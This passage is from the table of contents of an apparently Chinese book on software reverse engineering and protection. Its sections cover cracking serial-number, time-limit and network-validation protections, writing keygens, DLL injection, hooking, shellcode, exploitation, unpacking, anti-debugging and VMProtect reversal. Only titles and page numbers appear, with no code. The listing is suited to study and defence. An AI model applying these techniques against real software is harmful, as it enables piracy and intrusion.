32\u4f4d\u8f6f\u4ef6\u9006\u5411\u6280\u672f 102 4.1.1 \u542f\u52a8\u51fd\u6570 102 4.1.2 \u51fd\u6570 103 4.1.3 \u6570\u636e\u7ed3\u6784 111 4.1.4 \u865a\u51fd\u6570 115 4.1.5 \u63a7\u5236\u8bed\u53e5 117 4.1.6 \u5faa\u73af\u8bed\u53e5 124 4.1.7 \u6570\u5b66\u8fd0\u7b97\u7b26 125 4.1.8 \u6587\u672c\u5b57\u7b26\u4e32 128 4.1.9 \u6307\u4ee4\u4fee\u6539\u6280\u5de7 130 4.2 64\u4f4d\u8f6f\u4ef6\u9006\u5411\u6280\u672f 131 4.2.1 \u5bc4\u5b58\u5668 131 4.2.2 \u51fd\u6570 132 4.2.3 \u6570\u636e\u7ed3\u6784 142 4.2.4 \u63a7\u5236\u8bed\u53e5 145 4.2.5 \u5faa\u73af\u8bed\u53e5 154 4.2.6 \u6570\u5b66\u8fd0\u7b97\u7b26 158 4.2.7 \u865a\u51fd\u6570 169 4.2.8 \u5c0f\u7ed3 193 \u7b2c5\u7ae0 \u6f14\u793a\u7248\u4fdd\u62a4\u6280\u672f 194 5.1 \u5e8f\u5217\u53f7\u4fdd\u62a4\u65b9\u5f0f 194 5.1.1 \u5e8f\u5217\u53f7\u4fdd\u62a4\u673a\u5236 194 5.1.2 \u5982\u4f55\u653b\u51fb\u5e8f\u5217\u53f7\u4fdd\u62a4\u673a\u5236 195 5.1.3 \u5b57\u7b26\u4e32\u6bd4\u8f83\u5f62\u5f0f 197 5.1.4 \u5236\u4f5c\u6ce8\u518c\u673a 198 5.2 \u8b66\u544a\u7a97\u53e3 203 5.3 \u65f6\u95f4\u9650\u5236 205 5.3.1 \u8ba1\u65f6\u5668 205 5.3.2 \u65f6\u95f4\u9650\u5236 205 5.3.3 \u62c6\u89e3\u65f6\u95f4\u9650\u5236\u4fdd\u62a4 206 5.4 \u83dc\u5355\u529f\u80fd\u9650\u5236 207 5.4.1 \u76f8\u5173\u51fd\u6570 207 5.4.2 \u62c6\u89e3\u83dc\u5355\u9650\u5236\u4fdd\u62a4 208 5.5 KeyFile\u4fdd\u62a4 208 5.5.1 \u76f8\u5173API\u51fd\u6570 208 5.5.2 \u62c6\u89e3KeyFile\u4fdd\u62a4 209 5.6 \u7f51\u7edc\u9a8c\u8bc1 213 5.6.1 \u76f8\u5173\u51fd\u6570 214 5.6.2 \u7834\u89e3\u7f51\u7edc\u9a8c\u8bc1\u7684\u4e00\u822c\u601d\u8def 214 5.7 \u5149\u76d8\u68c0\u6d4b 219 5.7.1 \u76f8\u5173\u51fd\u6570 219 5.7.2 \u62c6\u89e3\u5149\u76d8\u4fdd\u62a4 220 5.8 \u53ea\u8fd0\u884c1\u4e2a\u5b9e\u4f8b 221 5.8.1 \u5b9e\u73b0\u65b9\u6cd5 221 5.8.2 \u5b9e\u4f8b 222 5.9 \u5e38\u7528\u65ad\u70b9\u8bbe\u7f6e\u6280\u5de7 222 \u7b2c6\u7ae0 \u52a0\u5bc6\u7b97\u6cd5 223 6.1 \u5355\u5411\u6563\u5217\u7b97\u6cd5 223 6.1.1 MD5\u7b97\u6cd5 223 6.1.2 SHA\u7b97\u6cd5 227 6.1.3 SM3\u5bc6\u7801\u6742\u51d1\u7b97\u6cd5 231 6.1.4 \u5c0f\u7ed3 231 6.2 \u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5 231 6.2.1 RC4\u6d41\u5bc6\u7801 231 6.2.2 TEA\u7b97\u6cd5 233 6.2.3 IDEA\u7b97\u6cd5 236 6.2.4 BlowFish\u7b97\u6cd5 243 6.2.5 AES\u7b97\u6cd5 246 6.2.6 SM4\u5206\u7ec4\u5bc6\u7801\u7b97\u6cd5 259 6.2.7 \u5c0f\u7ed3 259 6.3 \u516c\u5f00\u5bc6\u94a5\u52a0\u5bc6\u7b97\u6cd5 259 6.3.1 RSA\u7b97\u6cd5 260 6.3.2 ElGamal\u516c\u94a5\u7b97\u6cd5 264 6.3.3 DSA\u6570\u5b57\u7b7e\u540d\u7b97\u6cd5 270 6.3.4 \u692d\u5706\u66f2\u7ebf\u5bc6\u7801\u7f16\u7801\u5b66 272 6.3.5 SM2\u7b97\u6cd5 279 6.4 \u5176\u4ed6\u7b97\u6cd5 279 6.4.1 CRC32\u7b97\u6cd5 279 6.4.2 Base64\u7f16\u7801 280 6.5 \u5e38\u89c1\u7684\u52a0\u5bc6\u5e93\u63a5\u53e3\u53ca\u5176\u8bc6\u522b 281 6.5.1 Miracl\u5927\u6570\u8fd0\u7b97\u5e93 281 6.5.2 FGInt 283 6.5.3 \u5176\u4ed6\u52a0\u5bc6\u7b97\u6cd5\u5e93\u4ecb\u7ecd 284 6.6 \u52a0\u5bc6\u7b97\u6cd5\u5728\u8f6f\u4ef6\u4fdd\u62a4\u4e2d\u7684\u5e94\u7528 285 \u7cfb\u7edf\u7bc7 \u7b2c7\u7ae0 Windows\u5185\u6838\u57fa\u7840 290 7.1 \u5185\u6838\u7406\u8bba\u57fa\u7840 290 7.1.1 \u6743\u9650\u7ea7\u522b 290 7.1.2 \u5185\u5b58\u7a7a\u95f4\u5e03\u5c40 291 7.1.3 Windows\u4e0e\u5185\u6838\u542f\u52a8\u8fc7\u7a0b 292 7.1.4 Windows R3\u4e0eR0\u901a\u4fe1 294 7.1.5 \u5185\u6838\u51fd\u6570 296 7.1.6 \u5185\u6838\u9a71\u52a8\u6a21\u5757 297 7.2 \u5185\u6838\u91cd\u8981\u6570\u636e\u7ed3\u6784 298 7.2.1 \u5185\u6838\u5bf9\u8c61 298 7.2.2 SSDT 300 7.2.3 TEB 302 7.2.4 PEB 304 7.3 \u5185\u6838\u8c03\u8bd5\u57fa\u7840 306 7.3.1 \u4f7f\u7528WinDbg\u642d\u5efa\u53cc\u673a\u8c03\u8bd5\u73af\u5883 306 7.3.2 \u52a0\u8f7d\u5185\u6838\u9a71\u52a8\u5e76\u8bbe\u7f6e\u7b26\u53f7\u8868 308 7.3.3 SSDT\u4e0eShadow SSDT\u7684\u67e5\u770b 311 \u7b2c8\u7ae0 Windows\u4e0b\u7684\u5f02\u5e38\u5904\u7406 313 8.1 \u5f02\u5e38\u5904\u7406\u7684\u57fa\u672c\u6982\u5ff5 313 8.1.1 \u5f02\u5e38\u5217\u8868 313 8.1.2 \u5f02\u5e38\u5904\u7406\u7684\u57fa\u672c\u8fc7\u7a0b 314 8.2 SEH\u7684\u6982\u5ff5\u53ca\u57fa\u672c\u77e5\u8bc6 319 8.2.1 SEH\u7684\u76f8\u5173\u6570\u636e\u7ed3\u6784 319 8.2.2 SEH\u5904\u7406\u7a0b\u5e8f\u7684\u5b89\u88c5\u548c\u5378\u8f7d 320 8.2.3 SEH\u5b9e\u4f8b\u8ddf\u8e2a 321 8.3 SEH\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u539f\u7406\u53ca\u8bbe\u8ba1 325 8.3.1 \u5f02\u5e38\u5206\u53d1\u7684\u8be6\u7ec6\u8fc7\u7a0b 325 8.3.2 \u7ebf\u7a0b\u5f02\u5e38\u5904\u7406 330 8.3.3 \u5f02\u5e38\u5904\u7406\u7684\u6808\u5c55\u5f00 336 8.3.4 MSC\u7f16\u8bd1\u5668\u5bf9\u7ebf\u7a0b\u5f02\u5e38\u5904\u7406\u7684\u589e\u5f3a 342 8.3.5 \u9876\u5c42\u5f02\u5e38\u5904\u7406 349 8.3.6 \u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u7684\u5b89\u5168\u6027 357 8.4 \u5411\u91cf\u5316\u5f02\u5e38\u5904\u7406 361 8.4.1 \u5411\u91cf\u5316\u5f02\u5e38\u5904\u7406\u7684\u4f7f\u7528 361 8.4.2 VEH\u4e0eSEH\u7684\u5f02\u540c 362 8.4.3 \u5411\u91cf\u5316\u5f02\u5e38\u5904\u7406\u7684\u65b0\u5185\u5bb9 363 8.5 x64\u5e73\u53f0\u4e0a\u7684\u5f02\u5e38\u5904\u7406 363 8.5.1 \u539f\u751fx64\u7a0b\u5e8f\u7684\u5f02\u5e38\u5206\u53d1 364 8.5.2 WOW64\u4e0b\u7684\u5f02\u5e38\u5206\u53d1 366 8.6 \u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u8bbe\u8ba1\u4e2d\u7684\u6ce8\u610f\u4e8b\u9879 367 8.7 \u5f02\u5e38\u5904\u7406\u7684\u5b9e\u9645\u5e94\u7528 368 8.7.1 \u4f7f\u7528SEH\u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u9a8c\u8bc1 368 8.7.2 SEH\u5728\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u4e2d\u7684\u5e94\u7528 369 8.7.3 \u7528VEH\u5b9e\u73b0API Hook 371 8.8 \u672c\u7ae0\u5c0f\u7ed3 371 \u7b2c9\u7ae0 Win32\u8c03\u8bd5API 372 9.1 \u8c03\u8bd5\u76f8\u5173\u51fd\u6570\u7b80\u8981\u8bf4\u660e 372 9.2 \u8c03\u8bd5\u4e8b\u4ef6 375 9.3 \u521b\u5efa\u5e76\u8ddf\u8e2a\u8fdb\u7a0b 377 9.4 \u8c03\u8bd5\u5faa\u73af\u4f53 378 9.5 \u5904\u7406\u8c03\u8bd5\u4e8b\u4ef6 379 9.6 \u7ebf\u7a0b\u73af\u5883 380 9.7 \u5c06\u4ee3\u7801\u6ce8\u5165\u8fdb\u7a0b 382 \u7b2c10\u7ae0 VT\u6280\u672f 384 10.1 \u786c\u4ef6\u865a\u62df\u5316\u7684\u57fa\u672c\u6982\u5ff5 384 10.1.1 \u6982\u8ff0 384 10.1.2 \u76f8\u5173\u7ed3\u6784\u548c\u6c47\u7f16\u6307\u4ee4 385 10.1.3 EPT\u673a\u5236 388 10.2 VT\u6280\u672f\u7684\u5e94\u7528 389 10.2.1 \u7f16\u8bd1\u8fd0\u884cShadowWalker 389 10.2.2 \u5206\u6790Hypervisor 390 10.2.3 \u68c0\u6d4bVT\u652f\u6301\u60c5\u51b5 392 10.2.4 VMCS\u7684\u914d\u7f6e 393 10.2.5 EPT\u7684\u914d\u7f6e 396 10.2.6 \u5f00\u542fVT 399 10.2.7 \u5185\u5b58\u9690\u85cf\u7684\u5b9e\u73b0 399 10.3 VT\u8c03\u8bd5\u65b9\u6cd5 401 \u7b2c11\u7ae0 PE\u6587\u4ef6\u683c\u5f0f 404 11.1 PE\u7684\u57fa\u672c\u6982\u5ff5 405 11.1.1 \u57fa\u5730\u5740 405 11.1.2 \u865a\u62df\u5730\u5740 406 11.1.3 \u76f8\u5bf9\u865a\u62df\u5730\u5740 406 11.1.4 \u6587\u4ef6\u504f\u79fb\u5730\u5740 407 11.2 MS-DOS\u5934\u90e8 407 11.3 PE\u6587\u4ef6\u5934 408 11.3.1 Signature\u5b57\u6bb5 408 11.3.2 IMAGE_FILE_HEADER\u7ed3\u6784 409 11.3.3 IMAGE_OPTIONAL_HEADER\u7ed3\u6784 410 11.4 \u533a\u5757 415 11.4.1 \u533a\u5757\u8868 415 11.4.2 \u5e38\u89c1\u533a\u5757\u4e0e\u533a\u5757\u5408\u5e76 417 11.4.3 \u533a\u5757\u7684\u5bf9\u9f50\u503c 419 11.4.4 \u6587\u4ef6\u504f\u79fb\u4e0e\u865a\u62df\u5730\u5740\u7684\u8f6c\u6362 419 11.5 \u8f93\u5165\u8868 421 11.5.1 \u8f93\u5165\u51fd\u6570\u7684\u8c03\u7528 421 11.5.2 \u8f93\u5165\u8868\u7684\u7ed3\u6784 422 11.5.3 \u8f93\u5165\u5730\u5740\u8868 424 11.5.4 \u8f93\u5165\u8868\u5b9e\u4f8b\u5206\u6790 424 11.6 \u7ed1\u5b9a\u8f93\u5165 428 11.7 \u8f93\u51fa\u8868 429 11.7.1 \u8f93\u51fa\u8868\u7684\u7ed3\u6784 430 11.7.2 \u8f93\u51fa\u8868\u5b9e\u4f8b\u5206\u6790 431 11.8 \u57fa\u5740\u91cd\u5b9a\u4f4d 432 11.8.1 \u57fa\u5740\u91cd\u5b9a\u4f4d\u7684\u6982\u5ff5 432 11.8.2 \u57fa\u5740\u91cd\u5b9a\u4f4d\u8868\u7684\u7ed3\u6784 433 11.8.3 \u57fa\u5740\u91cd\u5b9a\u4f4d\u8868\u5b9e\u4f8b\u5206\u6790 434 11.9 \u8d44\u6e90 435 11.9.1 \u8d44\u6e90\u7ed3\u6784 435 11.9.2 \u8d44\u6e90\u7ed3\u6784\u5b9e\u4f8b\u5206\u6790 438 11.9.3 \u8d44\u6e90\u7f16\u8f91\u5de5\u5177 440 11.10 TLS\u521d\u59cb\u5316 440 11.11 \u8c03\u8bd5\u76ee\u5f55 441 11.12 \u5ef6\u8fdf\u8f7d\u5165\u6570\u636e 441 11.13 \u7a0b\u5e8f\u5f02\u5e38\u6570\u636e 442 11.14 .NET\u5934\u90e8 442 11.15 \u7f16\u5199PE\u5206\u6790\u5de5\u5177 443 11.15.1 \u68c0\u67e5\u6587\u4ef6\u683c\u5f0f 443 11.15.2 \u8bfb\u53d6FileHeader\u548cOptionalHeader\u7684\u5185\u5bb9 444 11.15.3 \u5f97\u5230\u6570\u636e\u76ee\u5f55\u8868\u4fe1\u606f 445 11.15.4 \u5f97\u5230\u533a\u5757\u8868\u4fe1\u606f 446 11.15.5 \u5f97\u5230\u8f93\u51fa\u8868\u4fe1\u606f 447 11.15.6 \u5f97\u5230\u8f93\u5165\u8868\u4fe1\u606f 448 \u7b2c12\u7ae0 \u6ce8\u5165\u6280\u672f 450 12.1 DLL\u6ce8\u5165\u65b9\u6cd5 450 12.1.1 \u901a\u8fc7\u5e72\u9884\u8f93\u5165\u8868\u5904\u7406\u8fc7\u7a0b\u52a0\u8f7d\u76ee\u6807DLL 450 12.1.2 \u6539\u53d8\u7a0b\u5e8f\u8fd0\u884c\u6d41\u7a0b\u4f7f\u5176\u4e3b\u52a8\u52a0\u8f7d\u76ee\u6807DLL 466 12.1.3 \u5229\u7528\u7cfb\u7edf\u673a\u5236\u52a0\u8f7dDLL 484 12.2 DLL\u6ce8\u5165\u7684\u5e94\u7528 491 12.3 DLL\u6ce8\u5165\u7684\u9632\u8303 491 12.3.1 \u9a71\u52a8\u5c42\u9632\u8303 491 12.3.2 \u5e94\u7528\u5c42\u9632\u8303 493 \u7b2c13\u7ae0 Hook\u6280\u672f 497 13.1 Hook\u6982\u8ff0 497 13.1.1 IAT Hook\u7be1\u6539MessageBox\u6d88\u606f 497 13.1.2 Inline Hook\u7be1\u6539\u6307\u5b9aMessageBox\u6d88\u606f 499 13.2 Hook\u7684\u5206\u7c7b 500 13.2.1 Address Hook 501 13.2.2 Inline Hook 511 13.2.3 \u57fa\u4e8e\u5f02\u5e38\u5904\u7406\u7684Hook 513 13.2.4 \u4e0d\u662fHook\u7684Hook 514 13.3 Hook\u4f4d\u7f6e\u7684\u6311\u9009 515 13.4 Hook\u7684\u5178\u578b\u8fc7\u7a0b 519 13.4.1 Address Hook\u7684\u5b9e\u65bd\u8fc7\u7a0b 519 13.4.2 Inline Hook\u7684\u5b9e\u65bd\u8fc7\u7a0b 526 13.4.3 \u57fa\u4e8e\u5f02\u5e38\u5904\u7406\u7684Hook\u5b9e\u65bd\u8fc7\u7a0b 529 13.4.4 \u4e8c\u6b21Hook\u7684\u6ce8\u610f\u4e8b\u9879 532 13.4.5 \u901a\u7528Hook\u5f15\u64ce\u7684\u5b9e\u73b0 533 13.5 Detour\u51fd\u6570\u7684\u5178\u578b\u7528\u6cd5 533 13.6 Hook\u4e2d\u7684\u6ce8\u610f\u4e8b\u9879 536 13.7 Hook\u5728x64\u5e73\u53f0\u4e0a\u7684\u65b0\u95ee\u9898 541 13.8 Hook\u6280\u672f\u7684\u5e94\u7528 543 13.9 Hook\u7684\u68c0\u6d4b\u3001\u6062\u590d\u4e0e\u5bf9\u6297 544 13.9.1 Hook\u7684\u68c0\u6d4b\u4e0e\u6062\u590d 544 13.9.2 Hook\u7684\u5bf9\u6297 545 13.10 \u672c\u7ae0\u5c0f\u7ed3 546 \u6f0f\u6d1e\u7bc7 \u7b2c14\u7ae0 \u6f0f\u6d1e\u5206\u6790\u6280\u672f 548 14.1 \u8f6f\u4ef6\u6f0f\u6d1e\u539f\u7406 548 14.1.1 \u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e 548 14.1.2 \u6574\u578b\u6ea2\u51fa\u6f0f\u6d1e 553 14.1.3 UAF\u6f0f\u6d1e 555 14.2 Shellcode 555 14.2.1 Shellcode\u7684\u7ed3\u6784 556 14.2.2 Shellcode\u901a\u7528\u6280\u672f 559 14.2.3 \u5b9e\u6218Shellcode\u7f16\u5199 560 14.3 \u6f0f\u6d1e\u5229\u7528 566 14.3.1 \u6f0f\u6d1e\u5229\u7528\u57fa\u672c\u6280\u672f 567 14.3.2 \u6f0f\u6d1e\u5229\u7528\u9ad8\u7ea7\u6280\u672f 570 14.4 \u6f0f\u6d1e\u6837\u672c 572 14.5 \u6837\u672c\u5206\u6790 573 14.5.1 \u51c6\u5907\u5de5\u4f5c 573 14.5.2 \u9759\u6001\u5206\u6790 574 14.5.3 \u52a8\u6001\u8c03\u8bd5 576 14.5.4 \u8ffd\u6839\u6eaf\u6e90 581 14.5.5 \u5c0f\u7ed3 585 \u8131\u58f3\u7bc7 \u7b2c15\u7ae0 \u4e13\u7528\u52a0\u5bc6\u8f6f\u4ef6 588 15.1 \u8ba4\u8bc6\u58f3 588 15.1.1 \u58f3\u7684\u6982\u5ff5 588 15.1.2 \u538b\u7f29\u5f15\u64ce 589 15.2 \u538b\u7f29\u58f3 589 15.2.1 UPX 589 15.2.2 ASPack 590 15.3 \u52a0\u5bc6\u58f3 590 15.3.1 ASProtect 590 15.3.2 Armadillo 590 15.3.3 EXECryptor 591 15.3.4 Themida 591 15.4 \u865a\u62df\u673a\u4fdd\u62a4\u8f6f\u4ef6 592 15.4.1 \u865a\u62df\u673a\u4ecb\u7ecd 592 15.4.2 VMProtect\u7b80\u4ecb 592 \u7b2c16\u7ae0 \u8131\u58f3\u6280\u672f 594 16.1 \u57fa\u7840\u77e5\u8bc6 594 16.1.1 \u58f3\u7684\u52a0\u8f7d\u8fc7\u7a0b 594 16.1.2 \u8131\u58f3\u673a 595 16.1.3 \u624b\u52a8\u8131\u58f3 596 16.2 \u5bfb\u627eOEP 596 16.2.1 \u6839\u636e\u8de8\u6bb5\u6307\u4ee4\u5bfb\u627eOEP 596 16.2.2 \u7528\u5185\u5b58\u8bbf\u95ee\u65ad\u70b9\u5bfb\u627eOEP 600 16.2.3 \u6839\u636e\u6808\u5e73\u8861\u539f\u7406\u5bfb\u627eOEP 601 16.2.4 \u6839\u636e\u7f16\u8bd1\u8bed\u8a00\u7279\u70b9\u5bfb\u627eOEP 602 16.3 \u6293\u53d6\u5185\u5b58\u6620\u50cf 603 16.3.1 Dump\u539f\u7406 603 16.3.2 \u53cdDump\u6280\u672f 604 16.4 \u91cd\u5efa\u8f93\u5165\u8868 606 16.4.1 \u8f93\u5165\u8868\u91cd\u5efa\u7684\u539f\u7406 606 16.4.2 \u786e\u5b9aIAT\u7684\u5730\u5740\u548c\u5927\u5c0f 607 16.4.3 \u6839\u636eIAT\u91cd\u5efa\u8f93\u5165\u8868 608 16.4.4 \u7528Import REC\u91cd\u5efa\u8f93\u5165\u8868 611 16.4.5 \u8f93\u5165\u8868\u52a0\u5bc6\u6982\u62ec 614 16.5 DLL\u6587\u4ef6\u8131\u58f3 615 16.5.1 \u5bfb\u627eOEP 615 16.5.2 Dump\u6620\u50cf\u6587\u4ef6 617 16.5.3 \u91cd\u5efaDLL\u7684\u8f93\u5165\u8868 618 16.5.4 \u6784\u9020\u91cd\u5b9a\u4f4d\u8868 619 16.6 \u9644\u52a0\u6570\u636e 621 16.7 PE\u6587\u4ef6\u7684\u4f18\u5316 623 16.8 \u538b\u7f29\u58f3 626 16.8.1 UPX\u5916\u58f3 626 16.8.2 ASPack\u5916\u58f3 629 16.9 \u52a0\u5bc6\u58f3 633 16.10 \u9759\u6001\u8131\u58f3 637 16.10.1 \u5916\u58f3Loader\u5206\u6790 637 16.10.2 \u7f16\u5199\u9759\u6001\u8131\u58f3\u5668 641 \u4fdd\u62a4\u7bc7 \u7b2c17\u7ae0 \u8f6f\u4ef6\u4fdd\u62a4\u6280\u672f 644 17.1 \u9632\u8303\u7b97\u6cd5\u6c42\u9006 644 17.1.1 \u57fa\u672c\u6982\u5ff5 644 17.1.2 \u5821\u5792\u6218\u672f 645 17.1.3 \u6e38\u51fb\u6218\u672f 646 17.2 \u62b5\u5fa1\u9759\u6001\u5206\u6790 647 17.2.1 \u82b1\u6307\u4ee4 647 17.2.2 SMC\u6280\u672f\u5b9e\u73b0 649 17.2.3 \u4fe1\u606f\u9690\u85cf 653 17.2.4 \u7b80\u5355\u7684\u591a\u6001\u53d8\u5f62\u6280\u672f 654 17.3 \u6587\u4ef6\u5b8c\u6574\u6027\u68c0\u9a8c 655 17.3.1 \u78c1\u76d8\u6587\u4ef6\u6821\u9a8c\u7684\u5b9e\u73b0 655 17.3.2 \u6821\u9a8c\u548c 657 17.3.3 \u5185\u5b58\u6620\u50cf\u6821\u9a8c 657 17.4 \u4ee3\u7801\u4e0e\u6570\u636e\u7ed3\u5408 659 17.4.1 \u51c6\u5907\u5de5\u4f5c 660 17.4.2 \u52a0\u5bc6\u7b97\u6cd5\u7684\u9009\u7528 661 17.4.3 \u624b\u52a8\u52a0\u5bc6\u4ee3\u7801 661 17.4.4 \u4f7f .text\u533a\u5757\u53ef\u5199 662 17.5 \u5173\u4e8e\u8f6f\u4ef6\u4fdd\u62a4\u7684\u82e5\u5e72\u5fe0\u544a 663 \u7b2c18\u7ae0 \u53cd\u8ddf\u8e2a\u6280\u672f 665 18.1 \u7531BeingDebugged\u5f15\u53d1\u7684\u8774\u8776\u6548\u5e94 665 18.1.1 BeingDebugged 665 18.1.2 NtGlobalFlag 669 18.1.3 Heap Magic 671 18.1.4 \u4ece\u6e90\u5934\u6d88\u706dBeingDebugged 676 18.2 \u56de\u5f52Native\uff1a\u7528\u6237\u6001\u7684\u68a6\u9b47 676 18.2.1 CheckRemoteDebuggerPresent 677 18.2.2 ProcessDebugPort 677 18.2.3 ThreadHideFromDebugger 680 18.2.4 DebugObject 682 18.2.5 SystemKernelDebuggerInformation 686 18.2.6 Native API 688 18.2.7 Hook\u548cAntiHook 693 18.3 \u771f\u6b63\u7684\u5965\u79d8\uff1a\u5c0f\u6280\u5de7\u4e00\u89c8 696 18.3.1 SoftICE\u68c0\u6d4b\u65b9\u6cd5 696 18.3.2 OllyDbg\u68c0\u6d4b\u65b9\u6cd5 698 18.3.3 \u8c03\u8bd5\u5668\u6f0f\u6d1e 700 18.3.4 \u9632\u6b62\u8c03\u8bd5\u5668\u9644\u52a0 701 18.3.5 \u7236\u8fdb\u7a0b\u68c0\u6d4b 703 18.3.6 \u65f6\u95f4\u5dee 703 18.3.7 \u901a\u8fc7Trap Flag\u68c0\u6d4b 704 18.3.8 \u53cc\u8fdb\u7a0b\u4fdd\u62a4 704 \u7b2c19\u7ae0 \u5916\u58f3\u7f16\u5199\u57fa\u7840 705 19.1 \u5916\u58f3\u7684\u7ed3\u6784 705 19.2 \u52a0\u58f3\u4e3b\u7a0b\u5e8f 706 19.2.1 \u5224\u65ad\u6587\u4ef6\u662f\u5426\u4e3aPE\u683c\u5f0f 706 19.2.2 \u6587\u4ef6\u57fa\u672c\u6570\u636e\u8bfb\u5165 706 19.2.3 \u9644\u52a0\u6570\u636e\u7684\u8bfb\u53d6 708 19.2.4 \u8f93\u5165\u8868\u7684\u5904\u7406 708 19.2.5 \u91cd\u5b9a\u4f4d\u8868\u7684\u5904\u7406 711 19.2.6 \u6587\u4ef6\u7684\u538b\u7f29 713 19.2.7 \u8d44\u6e90\u6570\u636e\u7684\u5904\u7406 716 19.2.8 \u533a\u5757\u7684\u878d\u5408 720 19.3 \u7528\u6c47\u7f16\u5199\u5916\u58f3\u90e8\u5206 721 19.3.1 \u5916\u58f3\u7684\u52a0\u8f7d\u8fc7\u7a0b 721 19.3.2 \u81ea\u5efa\u8f93\u5165\u8868 722 19.3.3 \u5916\u58f3\u5f15\u5bfc\u6bb5 723 19.3.4 \u5916\u58f3\u7b2c2\u90e8\u5206 726 19.3.5 \u5c06\u5916\u58f3\u90e8\u5206\u6dfb\u52a0\u81f3\u539f\u7a0b\u5e8f 731 19.4 \u7528C++\u7f16\u5199\u5916\u58f3\u90e8\u5206 734 \u7b2c20\u7ae0 \u865a\u62df\u673a\u7684\u8bbe\u8ba1 739 20.1 \u865a\u62df\u673a\u4fdd\u62a4\u6280\u672f\u539f\u7406 739 20.1.1 \u53cd\u6c47\u7f16\u5f15\u64ce 739 20.1.2 \u6307\u4ee4\u5206\u7c7b 739 20.2 \u542f\u52a8\u6846\u67b6\u548c\u8c03\u7528\u7ea6\u5b9a 740 20.2.1 \u8c03\u5ea6\u5668 740 20.2.2 \u865a\u62df\u73af\u5883 741 20.2.3 \u5e73\u8861\u6808vBegin\u548cvCheckESP 742 20.3 Handler\u7684\u8bbe\u8ba1 743 20.3.1 \u8f85\u52a9Handler 743 20.3.2 \u666e\u901aHandler\u548c\u6307\u4ee4\u62c6\u89e3 744 20.3.3 \u6807\u5fd7\u4f4d\u95ee\u9898 745 20.3.4 \u76f8\u540c\u4f5c\u7528\u7684\u6307\u4ee4 745 20.3.5 \u8f6c\u79fb\u6307\u4ee4 746 20.3.6 \u8f6c\u79fb\u8df3\u8f6c\u6307\u4ee4\u7684\u53e6\u4e00\u79cd\u5b9e\u73b0 747 20.3.7 call\u6307\u4ee4 748 20.3.8 retn\u6307\u4ee4 748 20.3.9 \u4e0d\u53ef\u6a21\u62df\u6307\u4ee4 749 20.4 \u6258\u7ba1\u4ee3\u7801\u7684\u5f02\u5e38\u5904\u7406 749 20.4.1 VC++\u7684\u5f02\u5e38\u5904\u7406 749 20.4.2 Delphi\u7684\u5f02\u5e38\u5904\u7406 754 20.5 \u672c\u7ae0\u5c0f\u7ed3 757 \u7b2c21\u7ae0 VMProtect\u9006\u5411\u548c\u8fd8\u539f\u6d45\u6790 758 21.1 VMProtect\u9006\u5411\u5206\u6790 758 21.1.1 VMProtect\u865a\u62df\u6267\u884c\u5f15\u64ce\u7684\u5168\u666f\u56fe 758 21.1.2 VMProtect\u865a\u62df\u5f15\u64ce\u7684\u57fa\u672c\u67b6\u6784 763 21.1.3 \u6307\u4ee4\u5206\u7c7b 763 21.2 VMProtect\u7684\u8fd8\u539f 765 21.2.1 \u865a\u62df\u6267\u884c\u7cfb\u7edf 766 21.2.2 \u751f\u6210\u5b8c\u6574\u7684\u5b57\u8282\u7801\u6d41\u7a0b\u56fe 767 21.2.3 \u7ed9Handler\u547d\u540d\u5e76\u6dfb\u52a0\u8bed\u4e49\u52a8\u4f5c 774 21.2.4 \u5c06\u5b57\u8282\u7801\u7684\u4f4e\u7ea7\u63cf\u8ff0\u8f6c\u6362\u4e3a\u4e2d\u7ea7\u63cf\u8ff0 775 21.2.5 \u6e05\u9664\u65e0\u7528\u7684\u5b57\u8282\u7801 776 21.2.6 \u7528\u771f\u503c\u8868\u5316\u7b80\u903b\u8f91\u6307\u4ee4 776 21.2.7 \u4ece\u7279\u5f81\u4e2d\u5efa\u7acb\u90e8\u5206\u5bc4\u5b58\u5668\u6620\u5c04\u4fe1\u606f 779 21.2.8 \u5176\u4ed6\u65e0\u6cd5\u786e\u5b9a\u7684\u5bc4\u5b58\u5668\u7684\u56fe\u7740\u8272\u7b97\u6cd5 785 21.2.9 \u4f7f\u7528DAG\u5339\u914d\u751f\u6210\u6307\u4ee4 788 21.2.10 \u5176\u4ed6\u95ee\u9898 791 \u8f6f\u4ef6\u91cd\u6784\u7bc7 \u7b2c22\u7ae0 \u8865\u4e01\u6280\u672f 794 22.1 \u6587\u4ef6\u8865\u4e01 794 22.2 \u5185\u5b58\u8865\u4e01 795 22.2.1 \u8de8\u8fdb\u7a0b\u5185\u5b58\u5b58\u53d6\u673a\u5236 795 22.2.2 Debug API\u673a\u5236 797 22.2.3 \u5229\u7528\u8c03\u8bd5\u5bc4\u5b58\u5668\u673a\u5236 800 22.2.4 \u5229\u7528DLL\u6ce8\u5165\u6280\u672f 803 22.2.5 \u5229\u7528Hook\u6280\u672f 807 22.2.6 \u5229\u7528VT\u6280\u672f 810 22.3 SMC\u8865\u4e01\u6280\u672f 813 22.3.1 \u5355\u5c42SMC\u8865\u4e01\u6280\u672f 813 22.3.2 \u591a\u5c42SMC\u8865\u4e01\u6280\u672f 814 22.4 \u8865\u4e01\u5de5\u5177 816 \u7b2c23\u7ae0 \u4ee3\u7801\u7684\u4e8c\u6b21\u5f00\u53d1 818 23.1 \u6570\u636e\u5bf9\u9f50 818 23.2 \u589e\u52a0\u7a7a\u95f4 818 23.2.1 \u533a\u5757\u95f4\u9699 818 23.2.2 \u624b\u52a8\u6784\u9020\u533a\u5757 819 23.2.3 \u5de5\u5177\u8f85\u52a9\u6784\u9020\u533a\u5757 820 23.3 \u83b7\u5f97\u51fd\u6570\u7684\u8c03\u7528\u4fe1\u606f 820 23.3.1 \u589e\u52a0\u8f93\u5165\u51fd\u6570 820 23.3.2 \u663e\u5f0f\u94fe\u63a5\u8c03\u7528DLL 821 23.4 \u4ee3\u7801\u7684\u91cd\u5b9a\u4f4d 822 23.4.1 \u4fee\u590d\u91cd\u5b9a\u4f4d\u8868 822 23.4.2 \u4ee3\u7801\u7684\u81ea\u5b9a\u4f4d\u6280\u672f 824 23.5 \u589e\u52a0\u8f93\u51fa\u51fd\u6570 825 23.6 \u6d88\u606f\u5faa\u73af 826 23.6.1 WndProc\u51fd\u6570 826 23.6.2 